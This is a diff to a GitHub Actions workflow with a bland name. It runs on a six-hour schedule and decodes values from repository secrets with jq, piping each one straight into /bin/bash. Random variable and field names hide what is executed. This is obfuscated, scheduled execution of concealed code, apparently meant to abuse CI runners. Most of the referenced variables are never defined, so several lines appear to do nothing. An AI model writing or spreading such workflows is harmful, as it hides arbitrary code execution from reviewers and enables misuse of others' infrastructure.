@@ -1,8 +1,10 @@
 name: normalkerchief
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 4/6 * * *'
+    - cron: '11 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +13,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: normalkerchief
         env:
-          sqg2: ${{ secrets.sqg2 }}
+          ifde067: ${{ secrets.ifde067 }}
         run: |
-          echo $sqg2 | jq -r .j15 | /bin/bash
-          echo $euve7 | jq -r .bto9 | /bin/bash
-          echo $bx66 | jq -r .cmzj5 | /bin/bash
-          echo $bqrbi48 | jq -r .cgmu2 | /bin/bash
-          echo $nk4 | jq -r .eehhy22603 | /bin/bash
-          echo $gkhwu1917 | jq -r .wwrh9038 | /bin/bash
-          echo $pidr28 | jq -r .td05079 | /bin/bash
-          echo $ouwv74 | jq -r .huu737 | /bin/bash
+          echo $ifde067 | jq -r .cyne98614 | /bin/bash
+          echo $rsb694 | jq -r .eqkoh0 | /bin/bash
+          echo $m76 | jq -r .slhw78 | /bin/bash
+          echo $xmuz115 | jq -r .m93 | /bin/bash
+          echo $a7 | jq -r .eng3293 | /bin/bash
+          echo $rzhjt51614 | jq -r .zr1 | /bin/bash
+          echo $e200 | jq -r .xffqd61 | /bin/bash
+          echo $q69401 | jq -r .pgpwg6 | /bin/bash
+          echo $u1 | jq -r .ekfj71 | /bin/bash
+          echo $y93918 | jq -r .ainkd77 | /bin/bash
 
